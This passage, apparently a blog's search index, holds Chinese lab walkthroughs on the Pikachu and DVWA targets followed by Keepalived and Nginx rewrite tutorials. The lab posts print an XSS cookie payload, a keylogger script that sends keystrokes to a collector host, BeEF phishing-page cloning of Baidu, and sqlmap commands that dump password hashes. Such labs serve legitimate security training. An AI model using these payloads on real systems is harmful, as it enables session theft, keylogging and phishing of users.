打开pikachu盲打模块，输入常规的payload，然后提交 \u003cscript\u003ealert(document.cookie)\u003c/script\u003e 根据提示登录后台 http://172.31.5.7/vul/xss/xssblind/admin.php 登录后弹窗，获得账号的cookie 1.2 键盘记录 键盘记录，利用pikachu自带脚本来实现 查看脚本内容： [root@centos7 ~]# docker exec -it pikachu bash -c \"cat /var/www/html/pkxss/rkeypress/rk.js\" /** * Created by runner on 2018/7/8. */ function createAjax(){ var request=false; if(window.XMLHttpRequest){ request=new XMLHttpRequest(); if(request.overrideMimeType){ request.overrideMimeType(\"text/xml\"); } }else if(window.ActiveXObject){ var versions=['Microsoft.XMLHTTP', 'MSXML.XMLHTTP', 'Msxml2.XMLHTTP.7.0','Msxml2.XMLHTTP.6.0','Msxml2.XMLHTTP.5.0', 'Msxml2.XMLHTTP.4.0', 'MSXML2.XMLHTTP.3.0', 'MSXML2.XMLHTTP']; for(var i=0; i\u003cversions.length; i++){ try{ request=new ActiveXObject(versions[i]); if(request){ return request; } }catch(e){ request=false; } } } return request; } var ajax=null; var xl=\"datax=\"; function onkeypress() { var realkey = String.fromCharCode(event.keyCode); xl+=realkey; show(); } document.onkeypress = onkeypress; function show() { ajax = createAjax(); ajax.onreadystatechange = function () { if (ajax.readyState == 4) { if (ajax.status == 200) { var data = ajax.responseText; } else { alert(\"页面请求失败\"); } } } var postdate = xl; ajax.open(\"POST\", \"http://192.168.1.15/pkxss/rkeypress/rkserver.php\",true); ajax.setRequestHeader(\"Content-type\", \"application/x-www-form-urlencoded\"); ajax.setRequestHeader(\"Content-length\", postdate.length); ajax.setRequestHeader(\"Connection\", \"close\"); ajax.send(postdate); 修改脚本中的IP为pikachu地址 [root@centos7 ~]# docker exec -it pikachu bash -c \"sed -i \"s/192\\.168\\.1\\.15/172.31.5.7/\" /var/www/html/pkxss/rkeypress/rk.js\" #查看修改结果 [root@centos7 ~]# docker exec -it pikachu bash -c \"cat /var/www/html/pkxss/rkeypress/rk.js | grep http\" ajax.open(\"POST\", \"http://172.31.5.7/pkxss/rkeypress/rkserver.php\",true); 在存储型XSS模块中输入payload \u003cscript src=\"http://172.31.5.7/pkxss/rkeypress/rk.js\"\u003e\u003c/script\u003e 在当前标签页随意点击几个按键（如：test） 登录后台 获取到了键盘记录 ","date":"2023-02-25","objectID":"/posts/xss/%E5%88%A9%E7%94%A8xss%E6%BC%8F%E6%B4%9E%E8%8E%B7%E5%8F%96cookie/:2:1","tags":[],"title":"利用XSS漏洞获取cookie","uri":"/posts/xss/%E5%88%A9%E7%94%A8xss%E6%BC%8F%E6%B4%9E%E8%8E%B7%E5%8F%96cookie/"},{"categories":["XSS"],"content":"2.2 利用Beef-XSS获取cookie BeEF（Browser Exploitation Framework）是一款非常强大的Web框架攻击平台，集成了许多 payload，可以通过XSS漏洞配合JavaScript脚本和Metasploit进行渗透。基于Ruby语言编写，并且支持 图形化界面，操作简单。 2.2.1 安装beef-xss 打开kali系统（172.31.5.9） #安装beef sudo apt install -y beef-xss 修改配置文件中的IP和默认密码（不修改无法启动） ┌──(root㉿kali)-[/usr/share/beef-xss] └─# cat /usr/share/beef-xss/config.yaml |grep passwd passwd: \"123\" ┌──(root㉿kali)-[/usr/share/beef-xss] └─# cat /usr/share/beef-xss/config.yaml |grep host host: \"172.31.5.9\" 启动beef cd /usr/share/beef-xss \u0026\u0026 ./beef 浏览器访问：http://172.31.5.9:3000/ui/panel 使用账号 beef/123 登录： 2.2.2 制作钓鱼页面 用法说明： curl -H \"Content-Type: application/json; charset=UTF-8\" -d '{\"url\":\"\u003cURL of site to clone\u003e\", \"mount\":\"\u003cwhere to mount\u003e\"}' -X POST http://\u003cBeEFURL\u003e/api/seng/clone_page?token=\u003ctoken\u003e // \u003cURL of site to clone\u003e 需要克隆的网址 // \u003cwhere to mount\u003e 克隆的页面在服务器的哪个路径访问 // \u003ctoken\u003e 服务启动时的 beef API key 示例：克隆百度主页面 ┌──(root㉿kali)-[/usr/share/beef-xss] └─# curl -H \"Content-Type: application/json; charset=UTF-8\" -d '{\"url\":\"https://www.baidu.com\",\"mount\":\"/baidu\"}' -X POST http://172.31.5.9:3000/api/seng/clone_page?token=a7e0f6aaccfed873134b9f458f29824aaf9ebd7a {\"success\":true,\"mount\":\"/baidu\"} 克隆成功 2.2.3 获取用户cookie 模拟用户访问该钓鱼页面 http://172.31.5.9:3000/baidu 登陆beef，发现有机器上线 获得用户cookie 验证结果 ","date":"2023-02-25","objectID":"/posts/xss/%E5%88%A9%E7%94%A8xss%E6%BC%8F%E6%B4%9E%E8%8E%B7%E5%8F%96cookie/:2:2","tags":[],"title":"利用XSS漏洞获取cookie","uri":"/posts/xss/%E5%88%A9%E7%94%A8xss%E6%BC%8F%E6%B4%9E%E8%8E%B7%E5%8F%96cookie/"},{"categories":["Sql_Injection"],"content":"使用Sqlmap工具完成对DVWA数据库的注入过程，要求按照库、表、列、内容的顺序进行注入； ","date":"2023-02-19","objectID":"/posts/sql_injection/%E4%BD%BF%E7%94%A8sqlmap%E6%B3%A8%E5%85%A5dvwa%E6%95%B0%E6%8D%AE%E5%BA%93/:0:0","tags":[],"title":"使用sqlmap注入DVWA数据库","uri":"/posts/sql_injection/%E4%BD%BF%E7%94%A8sqlmap%E6%B3%A8%E5%85%A5dvwa%E6%95%B0%E6%8D%AE%E5%BA%93/"},{"categories":["Sql_Injection"],"content":"一、 实验环境 软件名 版本 部署方式 IP地址 sqlmap 1.6.11#stable kali自带 172.31.5.38 DVWA Version 1.10 Development (Release date: 2015-10-08) docker run -d -p 80:80 docker.io/sagikazarmark/dvwa 172.31.5.7 ","date":"2023-02-19","objectID":"/posts/sql_injection/%E4%BD%BF%E7%94%A8sqlmap%E6%B3%A8%E5%85%A5dvwa%E6%95%B0%E6%8D%AE%E5%BA%93/:1:0","tags":[],"title":"使用sqlmap注入DVWA数据库","uri":"/posts/sql_injection/%E4%BD%BF%E7%94%A8sqlmap%E6%B3%A8%E5%85%A5dvwa%E6%95%B0%E6%8D%AE%E5%BA%93/"},{"categories":["Sql_Injection"],"content":"二、 开始注入 ","date":"2023-02-19","objectID":"/posts/sql_injection/%E4%BD%BF%E7%94%A8sqlmap%E6%B3%A8%E5%85%A5dvwa%E6%95%B0%E6%8D%AE%E5%BA%93/:2:0","tags":[],"title":"使用sqlmap注入DVWA数据库","uri":"/posts/sql_injection/%E4%BD%BF%E7%94%A8sqlmap%E6%B3%A8%E5%85%A5dvwa%E6%95%B0%E6%8D%AE%E5%BA%93/"},{"categories":["Sql_Injection"],"content":"2.1 进入DVWA SQL Injection模块 DVWA是需要登录的，因此爆破时需要携带cookie信息。 在输入框输入数字1提交，在地址栏获得要注入的url（本案例中注入字段就是id） 调整 DVWA Security 的安全级别为low ","date":"2023-02-19","objectID":"/posts/sql_injection/%E4%BD%BF%E7%94%A8sqlmap%E6%B3%A8%E5%85%A5dvwa%E6%95%B0%E6%8D%AE%E5%BA%93/:2:1","tags":[],"title":"使用sqlmap注入DVWA数据库","uri":"/posts/sql_injection/%E4%BD%BF%E7%94%A8sqlmap%E6%B3%A8%E5%85%A5dvwa%E6%95%B0%E6%8D%AE%E5%BA%93/"},{"categories":["Sql_Injection"],"content":"2.2 判断注入点 ┌──(root㉿kali)-[~] └─# sqlmap --batch -u \"http://172.31.5.7/vulnerabilities/sqli/?id=1\u0026Submit=Submit#\" --cookie=\"PHPSESSID=p8set09itok4kmnotmgr8tq9l5; security=low\" -p id # -p 指定注入参数为id #获得数据库版本 web server operating system: Linux Debian 8 (jessie) web application technology: Apache 2.4.10 back-end DBMS: MySQL \u003e= 5.0 ","date":"2023-02-19","objectID":"/posts/sql_injection/%E4%BD%BF%E7%94%A8sqlmap%E6%B3%A8%E5%85%A5dvwa%E6%95%B0%E6%8D%AE%E5%BA%93/:2:2","tags":[],"title":"使用sqlmap注入DVWA数据库","uri":"/posts/sql_injection/%E4%BD%BF%E7%94%A8sqlmap%E6%B3%A8%E5%85%A5dvwa%E6%95%B0%E6%8D%AE%E5%BA%93/"},{"categories":["Sql_Injection"],"content":"2.3 获取mysql中的所有库 ┌──(root㉿kali)-[~] └─# sqlmap --batch -u \"http://172.31.5.7/vulnerabilities/sqli/?id=1\u0026Submit=Submit#\" --cookie=\"PHPSESSID=p8set09itok4kmnotmgr8tq9l5; security=low\" --dbs #获得数据库列表 available databases [4]: [*] dvwa [*] information_schema [*] mysql [*] performance_schema ","date":"2023-02-19","objectID":"/posts/sql_injection/%E4%BD%BF%E7%94%A8sqlmap%E6%B3%A8%E5%85%A5dvwa%E6%95%B0%E6%8D%AE%E5%BA%93/:2:3","tags":[],"title":"使用sqlmap注入DVWA数据库","uri":"/posts/sql_injection/%E4%BD%BF%E7%94%A8sqlmap%E6%B3%A8%E5%85%A5dvwa%E6%95%B0%E6%8D%AE%E5%BA%93/"},{"categories":["Sql_Injection"],"content":"2.4 获取dvwa库中的所有表 ┌──(root㉿kali)-[~] └─# sqlmap --batch -u \"http://172.31.5.7/vulnerabilities/sqli/?id=1\u0026Submit=Submit#\" --cookie=\"PHPSESSID=p8set09itok4kmnotmgr8tq9l5; security=low\" -D dvwa --tables #获得表 Database: dvwa [2 tables] +-----------+ | guestbook | | users | +-----------+ ","date":"2023-02-19","objectID":"/posts/sql_injection/%E4%BD%BF%E7%94%A8sqlmap%E6%B3%A8%E5%85%A5dvwa%E6%95%B0%E6%8D%AE%E5%BA%93/:2:4","tags":[],"title":"使用sqlmap注入DVWA数据库","uri":"/posts/sql_injection/%E4%BD%BF%E7%94%A8sqlmap%E6%B3%A8%E5%85%A5dvwa%E6%95%B0%E6%8D%AE%E5%BA%93/"},{"categories":["Sql_Injection"],"content":"2.5 获取users表中的所有字段 ┌──(root㉿kali)-[~] └─# sqlmap --batch -u \"http://172.31.5.7/vulnerabilities/sqli/?id=1\u0026Submit=Submit#\" --cookie=\"PHPSESSID=p8set09itok4kmnotmgr8tq9l5; security=low\" -D dvwa -T users --columns #获得表中的字段 Database: dvwa Table: users [8 columns] +--------------+-------------+ | Column | Type | +--------------+-------------+ | user | varchar(15) | | avatar | varchar(70) | | failed_login | int(3) | | first_name | varchar(15) | | last_login | timestamp | | last_name | varchar(15) | | password | varchar(32) | | user_id | int(6) | +--------------+-------------+ ","date":"2023-02-19","objectID":"/posts/sql_injection/%E4%BD%BF%E7%94%A8sqlmap%E6%B3%A8%E5%85%A5dvwa%E6%95%B0%E6%8D%AE%E5%BA%93/:2:5","tags":[],"title":"使用sqlmap注入DVWA数据库","uri":"/posts/sql_injection/%E4%BD%BF%E7%94%A8sqlmap%E6%B3%A8%E5%85%A5dvwa%E6%95%B0%E6%8D%AE%E5%BA%93/"},{"categories":["Sql_Injection"],"content":"2.6 获得user和password ┌──(root㉿kali)-[~] └─# sqlmap --batch -u \"http://172.31.5.7/vulnerabilities/sqli/?id=1\u0026Submit=Submit#\" --cookie=\"PHPSESSID=p8set09itok4kmnotmgr8tq9l5; security=low\" -D dvwa -T users -C last_name,password --dump #获得账号信息 Database: dvwa Table: users [5 entries] +-----------+---------------------------------------------+ | last_name | password | +-----------+---------------------------------------------+ | admin | 5f4dcc3b5aa765d61d8327deb882cf99 (password) | | Brown | e99a18c428cb38d5f260853678922e03 (abc123) | | Me | 8d3533d75ae2c3966d7e0d4fcc69216b (charley) | | Picasso | 0d107d09f5bbe40cade3de5c71e9e9b7 (letmein) | | Smith | 5f4dcc3b5aa765d61d8327deb882cf99 (password) | +-----------+---------------------------------------------+ ","date":"2023-02-19","objectID":"/posts/sql_injection/%E4%BD%BF%E7%94%A8sqlmap%E6%B3%A8%E5%85%A5dvwa%E6%95%B0%E6%8D%AE%E5%BA%93/:2:6","tags":[],"title":"使用sqlmap注入DVWA数据库","uri":"/posts/sql_injection/%E4%BD%BF%E7%94%A8sqlmap%E6%B3%A8%E5%85%A5dvwa%E6%95%B0%E6%8D%AE%E5%BA%93/"},{"categories":[null],"content":"二进制安装Keepalived 支持的系统：Centos7 #!/bin/bash keepalived_version='keepalived-2.0.20.tar.gz' source_package_path='/usr/local/src/' yum -y install gcc gcc-c++ curl openssl-devel libnl3-devel net-snmp-devel [ ! -e $source_package_path/$keepalived_version ] \u0026\u0026 wget https://keepalived.org/software/$keepalived_version -P $source_package_path cd $source_package_path \u0026\u0026 tar xf $keepalived_version cd $source_package_path/$(echo $keepalived_version | sed -r 's/(.*).tar.gz/\\1/')/ \u0026\u0026 ./configure --prefix=/usr/local/keepalived --disable-fwmark # --prefix=/usr/local/keepalived 指定安装目录 make \u0026\u0026 make install [ ! -d /etc/keepalived ] \u0026\u0026 mkdir /etc/keepalived [ ! -f /etc/keepalived/keepalived.conf ] \u0026\u0026 cat \u003e\u003e /etc/keepalived/keepalived.conf \u003c\u003c EOF global_defs { # notification_email { # root@localhost # } # notification_email_from keepalived@localhost # smtp_server 127.0.0.1 # smtp_connect_timeout 30 router_id node1 #修改此行 vrrp_skip_check_adv_addr vrrp_garp_interval 0 vrrp_gna_interval 0 vrrp_mcast_group4 224.0.0.22 } vrrp_instance VI_1 { state BACKUP interface ens33 virtual_router_id 66 priority 100 #修改此行 advert_int 1 authentication { auth_type PASS auth_pass 321321 } virtual_ipaddress { 172.31.5.20 ens33 label ens33:0 } } EOF ","date":"2022-09-04","objectID":"/posts/shell/keepalived%E5%AE%89%E8%A3%85%E8%84%9A%E6%9C%AC/:0:0","tags":[null],"title":"Keepalived安装脚本","uri":"/posts/shell/keepalived%E5%AE%89%E8%A3%85%E8%84%9A%E6%9C%AC/"},{"categories":[null],"content":"Nginx实现网址重定向 Nginx服务器利用 ngx_http_rewrite_module 模块解析和处理rewrite请求，此功能依靠 PCRE(perl compatible regular expression)，因此编译之前要安装PCRE库，rewrite是nginx服务器的重要功能之一，用于实现URL的重写，URL的重写是非常有用的功能，比如它可以在我们改变网站结构之后，不需要客户端修改原来的书签，也无需其他网站修改我们的链接，就可以设置为访问，另外还可以在一定程度上提高网站的安全性。 ngx_http_rewrite_module 模块 官方文档： https://nginx.org/en/docs/http/ngx_http_rewrite_module.html ","date":"2022-08-10","objectID":"/posts/nginx/nginx%E5%AE%9E%E7%8E%B0rewrite%E5%8A%9F%E8%83%BD/:0:0","tags":[null],"title":"Nginx实现rewrite功能","uri":"/posts/nginx/nginx%E5%AE%9E%E7%8E%B0rewrite%E5%8A%9F%E8%83%BD/"},{"categories":[null],"content":"if 指令 官方文档：https://nginx.org/en/docs/http/ngx_http_rewrite_module.html#if if指令用于条件匹配判断，并根据条件判断结果选择不同的Nginx配置，可以配置在server或location块中进行配置，Nginx的if语法仅能使用if做单次判断，不支持使用if else或者if elif这样的多重判断，用法如下： if （条件匹配） { action } if 指令使用正则表达式对变量进行匹配，匹配成功时if指令认为条件为true，否则认为false，支持以下条件判断运算符： = #比较变量和字符串是否相等，相等时if指令认为该条件为true，反之为false != #比较变量和字符串是否不相等，不相等时if指令认为条件为true，反之为false ~ #区分大小写字符，可以通过正则表达式匹配，满足匹配条件为真，不满足匹配条件为假 !~ #区分大小写字符,判断是否匹配，不满足匹配条件为真，满足匹配条件为假 ~* #不区分大小写字符，可以通过正则表达式匹配，满足匹配条件为真，不满足匹配条件为假 !~* #不区分大小字符,判断是否匹配，满足匹配条件为假，不满足匹配条件为真 -f 和 !-f #判断请求的文件是否存在和是否不存在 -d 和 !-d #判断请求的目录是否存在和是否不存在 -x 和 !-x #判断文件是否可执行和是否不可执行 -e 和 !-e #判断请求的文件或目录是否存在和是否不存在(包括文件，目录，软链接) #注意： #如果$变量的值为空字符串或0，则if指令认为该条件为false，其他条件为true。 #nginx 1.0.1之前$变量的值如果以0开头的任意字符串会返回false #示例： location /main { index index.html; default_type text/html; if ( $scheme = http ){ echo \"if-----\u003e $scheme\"; } if ( $scheme = https ){ echo \"if ----\u003e $scheme\"; } #if (-f $request_filename) { # echo \"$request_filename is exist\"; #} if (!-e $request_filename) { echo \"$request_filename is not exist\"; #return 409; } } ","date":"2022-08-10","objectID":"/posts/nginx/nginx%E5%AE%9E%E7%8E%B0rewrite%E5%8A%9F%E8%83%BD/:1:0","tags":[null],"title":"Nginx实现rewrite功能","uri":"/posts/nginx/nginx%E5%AE%9E%E7%8E%B0rewrite%E5%8A%9F%E8%83%BD/"},{"categories":[null],"content":"set 指令 可以利用set指定定义变量，变量的值为字符串且支持字符串和nginx内置变量进行字符串拼接。 location /main { root /data/nginx/html/pc; index index.html; default_type text/html; set $name magedu; echo $name; set $my_port $server_port; echo $my_port; } ","date":"2022-08-10","objectID":"/posts/nginx/nginx%E5%AE%9E%E7%8E%B0rewrite%E5%8A%9F%E8%83%BD/:2:0","tags":[null],"title":"Nginx实现rewrite功能","uri":"/posts/nginx/nginx%E5%AE%9E%E7%8E%B0rewrite%E5%8A%9F%E8%83%BD/"},{"categories":[null],"content":"break 指令 用于中断当前相同作用域(location)中的其他Nginx指令，位于break指令后的其他指令不会执行。 location /main { root /data/nginx/html/pc; index index.html; default_type text/html; set $name magedu; echo $name; break; #location块中break后面的其他ngx_http_rewrite_module模块指令不会执行（如set指令） set $my_port $server_port; echo $my_port; } ","date":"2022-08-10","objectID":"/posts/nginx/nginx%E5%AE%9E%E7%8E%B0rewrite%E5%8A%9F%E8%83%BD/:3:0","tags":[null],"title":"Nginx实现rewrite功能","uri":"/posts/nginx/nginx%E5%AE%9E%E7%8E%B0rewrite%E5%8A%9F%E8%83%BD/"},{"categories":[null],"content":"return 指令 return用于完成对请求的处理，并直接向客户端返回响应状态码，比如:可以指定重定向URL(对于特殊重定向状态码，301/302等) 或者是指定提示文本内容(对于特殊状态码403/500等)，处于此指令后的所有配置都将不被执行，return可以在server、if 和 location块进行配置 语法格式： return code; #返回给客户端指定的HTTP状态码 return code [text]; #返回给客户端的状态码及响应报文的实体内容，可以调用变量,其中text如果有空格,需要用单或双引号引起来 return code URL; #返回给客户端的URL地址 范例： service error[root@centos7 nginx]# cat conf.d/pc.conf server { listen 80; server_name pc.test.org; location / { root /app/nginx/html/pc; default_type text/html; index index.html; if ($scheme = http) { #return 666; #return 666 \"not allow http\"; #return 301 http://www.baidu.com; return 500 \"service error\"; echo \"if ------\u003e $scheme\"; #return 后面的指令不再执行 } } } ##访问测试 [root@centos7 nginx]# curl pc.test.org service error[root@centos7 nginx]# ","date":"2022-08-10","objectID":"/posts/nginx/nginx%E5%AE%9E%E7%8E%B0rewrite%E5%8A%9F%E8%83%BD/:4:0","tags":[null],"title":"Nginx实现rewrite功能","uri":"/posts/nginx/nginx%E5%AE%9E%E7%8E%B0rewrite%E5%8A%9F%E8%83%BD/"},{"categories":[null],"content":"rewrite_log 指令 设置是否开启记录ngx_http_rewrite_module 模块日志记录到 error_log日志文件当中，可以配置在http、server、location 或 if 中 注意：开启rewrite日志需要提前设置日志级别为notice ##开启错误日志 [root@centos7 nginx]# cat /apps/nginx/conf/nginx.conf |grep error_log error_log logs/error.log notice; #开启rewrite_log [root@centos7 nginx]# cat /apps/nginx/conf.d/pc.conf server { listen 80; server_name pc.test.org; location / { root /app/nginx/html/pc; default_type text/html; index index.html; set $name test; rewrite_log on; break; set $my_port $server_port; #由于只用了break指令，故set指令不会执行 echo $my_port; #echo指令将报错 } } #访问测试 [root@centos7 nginx]# curl pc.test.org #查看日志记录 [root@centos7 nginx]# tail -1 /apps/nginx/logs/error.log 2022/08/15 19:40:03 [warn] 1277#0: *7 using uninitialized \"my_port\" variable, client: 172.16.16.88, server: pc.test.org, request: \"GET / HTTP/1.1\", host: \"pc.test.org\" rewrite 指令 通过正则表达式的匹配来改变URI，可以同时存在一个或多个指令，按照顺序依次对URI进行匹配，rewrite主要是针对用户请求的URL或者是URI做具体处理 官方文档：https://nginx.org/en/docs/http/ngx_http_rewrite_module.html#rewrite rewrite可以配置在 server、location、if 块中 语法格式： rewrite regex replacement [flag]; rewrite将用户请求的URI基于regex所描述的模式进行检查，匹配到时将其替换为表达式指定的新的URI 注意：如果在同一级配置块中存在多个rewrite规则，那么会自下而下逐个检查; 被某条件规则替换完成后，会重新进行新一轮的替换检查，隐含有循环机制, 但不超过10次; 如果超过，提示500响应码，[flag]所表示的标志位用于控制此循环机制 如果替换后的URL是以http://或https://开头，则替换结果会直接以重定向返回给客户端, 即永久重定向301 正则表达式 . #匹配除换行符以外的任意字符 \\w #匹配字母或数字或下划线或汉字 \\s #匹配任意的空白符 \\d #匹配数字 \\b #匹配单词的开始或结束 ^ #匹配字付串的开始 $ #匹配字符串的结束 * #匹配重复零次或更多次 + #匹配重复一次或更多次 ? #匹配重复零次或一次 (n) #匹配重复n次 {n,} #匹配重复n次或更多次 {n,m} #匹配重复n到m次 *? #匹配重复任意次，但尽可能少重复 +? #匹配重复1次或更多次，但尽可能少重复 ?? #匹配重复0次或1次，但尽可能少重复 {n,m}? #匹配重复n到m次，但尽可能少重复 {n,}? #匹配重复n次以上，但尽可能少重复 \\W #匹配任意不是字母，数字，下划线，汉字的字符 \\S #匹配任意不是空白符的字符 \\D #匹配任意非数字的字符 \\B #匹配不是单词开头或结束的位置 [^x] #匹配除了x以外的任意字符 [^magedu] #匹配除了magedu 这几个字母以外的任意字符 ","date":"2022-08-10","objectID":"/posts/nginx/nginx%E5%AE%9E%E7%8E%B0rewrite%E5%8A%9F%E8%83%BD/:5:0","tags":[null],"title":"Nginx实现rewrite功能","uri":"/posts/nginx/nginx%E5%AE%9E%E7%8E%B0rewrite%E5%8A%9F%E8%83%BD/"},{"categories":[null],"content":"rewrite flag 使用介绍 利用nginx的rewrite的指令，可以实现url的重新跳转，rewrtie有四种不同的flag，分别是redirect(临时 重定向302)、permanent(永久重定向301)、break和last。其中前两种是跳转型的flag，后两种是代理型 跳转型指由客户端浏览器重新对新地址进行请求 代理型是在WEB服务器内部实现跳转 rewrite 格式 Syntax: rewrite regex replacement [flag]; #通过正则表达式处理用户请求并返回替换后的数据包。 Default: — Context: server, location, if flag 说明 redirect; #临时重定向，重写完成后以临时重定向方式直接返回重写后生成的新URL给客户端，由客户端重新发起请求;使用相对路径,或者http://或https://开头，状态码：302 permanent; #重写完成后以永久重定向方式直接返回重写后生成的新URL给客户端，由客户端重新发起请求，状态码：301 break; #重写完成后,停止对当前URL在当前location中后续的其它重写操作，而后直接跳转至重写规则配置块之后的其它配置;结束循环，建议在location中使用 #适用于一个URL一次重写 last; #重写完成后,停止对当前URI在当前location中后续的其它重写操作，而后对新的URL启动新一轮重写检查，不建议在location中使用 #适用于一个URL多次重写，要注意避免出现超过十次以及URL重写后返回错误的给用户 ","date":"2022-08-10","objectID":"/posts/nginx/nginx%E5%AE%9E%E7%8E%B0rewrite%E5%8A%9F%E8%83%BD/:6:0","tags":[null],"title":"Nginx实现rewrite功能","uri":"/posts/nginx/nginx%E5%AE%9E%E7%8E%B0rewrite%E5%8A%9F%E8%83%BD/"},{"categories":[null],"content":"rewrite 案例：域名重定向 重定向分为临时重定向（301）和永久重定向（302），临时重定向不会缓存域名解析记录(A记录)，但是永久重定向会缓存。 示例：因业务需要，需将访问源域名pc.test.com 的请求重定向到mobile.test.com ##准备两个站点 [root@centos7 nginx]# curl pc.test.com pc_page [root@centos7 nginx]# curl mobile.test.com mobile_page ##配置跳转规则 [root@centos7 nginx]# cat conf.d/pc.conf server { listen 80; server_name pc.test.com; location / { root /apps/nginx/html/pc; default_type text/html; index index.html; #rewrite / http://mobile.test.com; #跳转至mobile.test.com } } #测试跳转 [root@centos7 nginx]# curl pc.test.com -L mobile_page ","date":"2022-08-10","objectID":"/posts/nginx/nginx%E5%AE%9E%E7%8E%B0rewrite%E5%8A%9F%E8%83%BD/:7:0","tags":[null],"title":"Nginx实现rewrite功能","uri":"/posts/nginx/nginx%E5%AE%9E%E7%8E%B0rewrite%E5%8A%9F%E8%83%BD/"},{"categories":[null],"content":"永久重定向 301 域名永久型调整，即域名永远跳转至另外一个新的域名，之前的域名再也不使用，跳转记录可以缓存到 客户端浏览器 永久重定向会缓存DNS解析记录, 浏览器中有 from disk cache 信息 示例：访问www.360buy.com (京东早期域名）将永久跳转至 www.jd.com （磁盘缓存该跳转信息） ","date":"2022-08-10","objectID":"/posts/nginx/nginx%E5%AE%9E%E7%8E%B0rewrite%E5%8A%9F%E8%83%BD/:7:1","tags":[null],"title":"Nginx实现rewrite功能","uri":"/posts/nginx/nginx%E5%AE%9E%E7%8E%B0rewrite%E5%8A%9F%E8%83%BD/"},{"categories":[null],"content":"临时重定向 302 域名临时重定向，告诉浏览器域名不是固定重定向到当前目标域名，后期可能随时会更改，因此浏览器 不会缓存当前域名的解析记录，而浏览器会缓存永久重定向的DNS解析记录，这也是临时重定向与永久 重定向最大的本质区别。 ","date":"2022-08-10","objectID":"/posts/nginx/nginx%E5%AE%9E%E7%8E%B0rewrite%E5%8A%9F%E8%83%BD/:7:2","tags":[null],"title":"Nginx实现rewrite功能","uri":"/posts/nginx/nginx%E5%AE%9E%E7%8E%B0rewrite%E5%8A%9F%E8%83%BD/"},{"categories":[null],"content":"rewrite 案例：break与last ","date":"2022-08-10","objectID":"/posts/nginx/nginx%E5%AE%9E%E7%8E%B0rewrite%E5%8A%9F%E8%83%BD/:8:0","tags":[null],"title":"Nginx实现rewrite功能","uri":"/posts/nginx/nginx%E5%AE%9E%E7%8E%B0rewrite%E5%8A%9F%E8%83%BD/"},{"categories":[null],"content":"break 案例 [root@centos7 conf.d]# cat pc.conf server { listen 80; server_name pc.test.com; location /break { root html; index index.html; rewrite ^/break/(.*) /test/$1 break; #重写URL后，直接返回相应的请求结果 } location /test { return 666 \"====end====\"; } } [root@centos7 conf.d]# curl pc.test.com/break/ ====end====[root@centos7 conf.d]# #访问/break/** ，被重写为/test/**，但是重写后的路径并不存在，报错404 [root@centos7 conf.d]# curl pc.test.com/break/** \u003chtml\u003e \u003chead\u003e\u003ctitle\u003e404 Not Found\u003c/title\u003e\u003c/head\u003e \u003cbody\u003e \u003ccenter\u003e\u003ch1\u003e404 Not Found\u003c/h1\u003e\u003c/center\u003e \u003chr\u003e\u003ccenter\u003enginx/1.18.0\u003c/center\u003e \u003c/body\u003e \u003c/html\u003e ","date":"2022-08-10","objectID":"/posts/nginx/nginx%E5%AE%9E%E7%8E%B0rewrite%E5%8A%9F%E8%83%BD/:8:1","tags":[null],"title":"Nginx实现rewrite功能","uri":"/posts/nginx/nginx%E5%AE%9E%E7%8E%B0rewrite%E5%8A%9F%E8%83%BD/"},{"categories":[null],"content":"last 案例 [root@centos7 conf.d]# cat pc.conf server { listen 80; server_name pc.test.com; location /break { root html; index index.html; rewrite ^/break/(.*) /test/$1 last; #重写请求URL后，重新发起请求匹配location } location /test { return 666 \"====end====\"; } } [root@centos7 conf.d]# curl pc.test.com/break/ ====end====[root@centos7 conf.d]# #访问/break/**, 被重写为/test/** , 重新发起新的匹配请求，匹配到/test，返回相应结果 [root@centos7 conf.d]# curl pc.test.com/break/** ====end====[root@centos7 conf.d]# ","date":"2022-08-10","objectID":"/posts/nginx/nginx%E5%AE%9E%E7%8E%B0rewrite%E5%8A%9F%E8%83%BD/:8:2","tags":[null],"title":"Nginx实现rewrite功能","uri":"/posts/nginx/nginx%E5%AE%9E%E7%8E%B0rewrite%E5%8A%9F%E8%83%BD/"},{"categories":[null],"content":"rewrite 案例：自动跳转https [root@centos7 conf.d]# cat pc.conf server { listen 80; listen 443 ssl; server_name pc.test.com; ssl_certificate /apps/nginx/certs/www.nginx.com.pem; ssl_certificate_key /apps/nginx/certs/www.nginx.com.key; ssl_session_cache shared:sslcache:20m; ssl_session_timeout 10m; location / { #配置全站https root html/pc; index index.html; if ($scheme = http) { # rewrite / https://$host redirect; } } location /login { #配置部分站点https加密，如登录界面 if ($scheme = http) { rewrite / https://$host/login redirect; } } } #访问测试，成功 [root@centos7 conf.d]# curl -ikL pc.test.com HTTP/1.1 302 Moved Temporarily Server: nginx/1.18.0 Date: Mon, 15 Aug 2022 17:43:20 GMT Content-Type: text/html Content-Length: 145 Connection: keep-alive Keep-Alive: timeout=60 Location: https://pc.test.com HTTP/1.1 200 OK Server: nginx/1.18.0 Date: Mon, 15 Aug 2022 17:43:20 GMT Content-Type: text/html Content-Length: 8 Last-Modified: Mon, 15 Aug 2022 12:24:47 GMT Connection: keep-alive Keep-Alive: timeout=60 ETag: \"62fa3b0f-8\" Accept-Ranges: bytes pc_page ","date":"2022-08-10","objectID":"/posts/nginx/nginx%E5%AE%9E%E7%8E%B0rewrite%E5%8A%9F%E8%83%BD/:9:0","tags":[null],"title":"Nginx实现rewrite功能","uri":"/posts/nginx/nginx%E5%AE%9E%E7%8E%B0rewrite%E5%8A%9F%E8%83%BD/"},{"categories":[null],"content":"rewrite 案例： 重定向错误页面到主页 案例：当用户访问一个不存在的URL时，将页面重定向至站点首页 [root@centos7 conf.d]# cat pc.conf server { listen 80; server_name pc.test.com; location / { root html/pc; index index.html; if ( !-e $request_filename ) { #配置跳转规则 rewrite .* http://$host; } } } #访问不存在的页面测试 [root@centos7 conf.d]# curl pc.test.com/** -L pc_page [root@centos7 conf.d]# curl pc.test.com/kk -L pc_page ","date":"2022-08-10","objectID":"/posts/nginx/nginx%E5%AE%9E%E7%8E%B0rewrite%E5%8A%9F%E8%83%BD/:10:0","tags":[null],"title":"Nginx实现rewrite功能","uri":"/posts/nginx/nginx%E5%AE%9E%E7%8E%B0rewrite%E5%8A%9F%E8%83%BD/"},{"categories":[null],"content":"其他应用案例 #案例1:如果客户端浏览器包含MSIE，则rewrite客户端请求到/msie目录下 if ( $http_user_agent ~ MSIE){ rewrite ^(.*)$ /msie/$1 break; } #案例2: 更换目录访问方式, 目录转换为对象存储形式 #要求: #/20200106/static -\u003e/static?id=20200106 #/20200123/image -\u003e/image?id=20200123 rewrite ^/(\\d+)/(.+)/ /$2?id=$l last; #案例3:多目录转换访问方式 